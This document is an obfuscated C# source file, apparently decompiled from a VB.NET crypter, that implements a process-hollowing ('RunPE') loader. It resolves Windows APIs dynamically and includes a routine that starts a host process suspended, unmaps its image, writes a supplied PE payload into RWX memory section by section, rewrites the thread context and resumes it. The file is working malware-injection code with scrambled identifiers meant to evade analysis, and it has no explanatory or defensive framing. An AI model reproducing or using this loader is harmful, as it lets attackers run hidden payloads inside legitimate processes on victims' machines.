using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class dvnyqmjIcslNwBbEzYdCEWKtfCAhvdUAciRokFcgskp
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool VesCGuoyfDlxSqgEpQCUR(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, uint[] Part2);

	public delegate uint bPKcLOSCIVOcEgyhd(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn);

	public delegate uint ETRvFLYpljOwttEhdZStEeSDIkKNkzxbanGhX(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, IntPtr Part2);

	public delegate IntPtr yywSirzjecZTyIksYHYgQWTwbbIhWATKVOKEyVjMwWCCBoTRgvZjlUEE(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool VvyKjUldEDVnxVmoEelhRiS(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, uint[] Part2);

	public delegate bool wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool OPgBYBrYGpJayUHcLpjpGPtbNLVN(IntPtr toIxOvClwMYZqTwruBeQSLjMElMldnqBn, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool PJYZjaOrYwwVXFMPjyIGeSFPQlVRbSFmDfwrQZgX(string toIxOvClwMYZqTwruBeQSLjMElMldnqBn, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] toIxOvClwMYZqTwruBeQSLjMElMldnqBn0);

	private static VesCGuoyfDlxSqgEpQCUR vesCGuoyfDlxSqgEpQCUR_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<VesCGuoyfDlxSqgEpQCUR>("kernel32", "SetThreadContext");

	private static bPKcLOSCIVOcEgyhd bPKcLOSCIVOcEgyhd_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<bPKcLOSCIVOcEgyhd>("kernel32", "ResumeThread");

	private static ETRvFLYpljOwttEhdZStEeSDIkKNkzxbanGhX etrvFLYpljOwttEhdZStEeSDIkKNkzxbanGhX_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<ETRvFLYpljOwttEhdZStEeSDIkKNkzxbanGhX>("ntdll", "NtUnmapViewOfSection");

	private static yywSirzjecZTyIksYHYgQWTwbbIhWATKVOKEyVjMwWCCBoTRgvZjlUEE yywSirzjecZTyIksYHYgQWTwbbIhWATKVOKEyVjMwWCCBoTRgvZjlUEE_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<yywSirzjecZTyIksYHYgQWTwbbIhWATKVOKEyVjMwWCCBoTRgvZjlUEE>("kernel32", "VirtualAllocEx");

	private static VvyKjUldEDVnxVmoEelhRiS vvyKjUldEDVnxVmoEelhRiS_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<VvyKjUldEDVnxVmoEelhRiS>("kernel32", "GetThreadContext");

	private static wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG>("kernel32", "WriteProcessMemory");

	private static OPgBYBrYGpJayUHcLpjpGPtbNLVN opgBYBrYGpJayUHcLpjpGPtbNLVN_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<OPgBYBrYGpJayUHcLpjpGPtbNLVN>("kernel32", "ReadProcessMemory");

	private static PJYZjaOrYwwVXFMPjyIGeSFPQlVRbSFmDfwrQZgX pjyzjaOrYwwVXFMPjyIGeSFPQlVRbSFmDfwrQZgX_0 = NeEPzcqTHOWXULrovVLzemOwfQxt<PJYZjaOrYwwVXFMPjyIGeSFPQlVRbSFmDfwrQZgX>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T NeEPzcqTHOWXULrovVLzemOwfQxt<T>(string GFthejZ, string owakYaCTowHTOKNZhJTNTHNbxXSVHi)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref GFthejZ), ref owakYaCTowHTOKNZhJTNTHNbxXSVHi), typeof(T));
	}

	public static bool NSxXQCdnGkijDzkAqiDEZOdhsOcBAIA(byte[] EfYnollVmOClJFLViMaoJ, string UwHVfveKHrSamwvkmPsrjmzPvYjtfTQD)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(EfYnollVmOClJFLViMaoJ, 60);
				int num2 = BitConverter.ToInt16(EfYnollVmOClJFLViMaoJ, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(EfYnollVmOClJFLViMaoJ, num + 84));
				if (pjyzjaOrYwwVXFMPjyIGeSFPQlVRbSFmDfwrQZgX_0(null, new StringBuilder(UwHVfveKHrSamwvkmPsrjmzPvYjtfTQD), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (vvyKjUldEDVnxVmoEelhRiS_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((opgBYBrYGpJayUHcLpjpGPtbNLVN_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)etrvFLYpljOwttEhdZStEeSDIkKNkzxbanGhX_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(EfYnollVmOClJFLViMaoJ, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(EfYnollVmOClJFLViMaoJ, num + 80));
							IntPtr part5 = yywSirzjecZTyIksYHYgQWTwbbIhWATKVOKEyVjMwWCCBoTRgvZjlUEE_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG_0(array[0], part5, EfYnollVmOClJFLViMaoJ, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(EfYnollVmOClJFLViMaoJ, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(EfYnollVmOClJFLViMaoJ, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							wfjzhTnqOZnLLaXFnSjSXOMtdHFBExvOhddGvmSFJVzTJNHJJQIsMG_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(EfYnollVmOClJFLViMaoJ, num + 40));
							vesCGuoyfDlxSqgEpQCUR_0(array[1], array2);
						}
					}
					bPKcLOSCIVOcEgyhd_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
